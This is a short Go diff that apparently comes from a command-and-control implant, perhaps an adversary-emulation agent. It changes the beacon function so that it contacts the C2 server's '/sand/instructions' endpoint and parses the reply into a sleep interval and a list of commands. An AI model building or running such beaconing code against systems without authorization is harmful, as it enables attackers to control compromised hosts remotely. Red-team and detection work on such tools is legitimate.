@@ -17,17 +17,21 @@ import (
 )
 
 // Instructions is a single call to the C2
-func Instructions(profile map[string]interface{}) interface{} {
+func Instructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
 	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
 	bites := request(address, data)
+	var out map[string]interface{}
 	if bites != nil {
 		fmt.Println("[+] beacon: ALIVE")
+		var commands interface{}
+		json.Unmarshal(bites, &out)
+		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
+		out["sleep"] = int(out["sleep"].(float64))
+		out["instructions"] = commands
 	} else {
 		fmt.Println("[-] beacon: DEAD")
 	}
-	var out interface{}
-	json.Unmarshal(bites, &out)
 	return out
 }
 
